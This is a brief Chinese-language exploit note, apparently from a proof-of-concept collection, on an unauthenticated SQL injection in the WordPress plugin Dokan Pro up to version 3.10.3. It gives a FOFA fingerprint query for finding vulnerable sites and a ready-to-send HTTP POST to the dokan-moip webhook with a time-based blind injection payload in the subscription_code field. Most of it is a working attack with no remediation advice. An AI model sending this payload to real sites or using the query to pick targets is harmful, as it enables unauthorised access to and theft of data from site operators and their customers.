## WordPress插件Dokan-Pro存在SQL注入漏洞

Dokan Pro插件在3.10.3及以下版本中，由于对用户提供的'code'参数缺乏足够的转义处理以及现有SQL查询准备不足，存在SQL注入漏洞。未授权攻击者可通过该漏洞向现有查询中注入额外的SQL语句，进而从数据库中提取敏感信息。

## fofa

```
"/wp-content/plugins/dokan-pro/"

```

## poc

```
POST /wp-admin/admin.php?webhook=dokan-moip HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0
Connection: close
Content-Length: 133
Accept-Encoding: gzip

{"env":"1","event":"invoice.created","resource":{"subscription_code":"11111' and (select 1 from (select sleep( if(1=1,6,0) ))x )='"}}
```

![image-20240626214430128](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406262144291.png)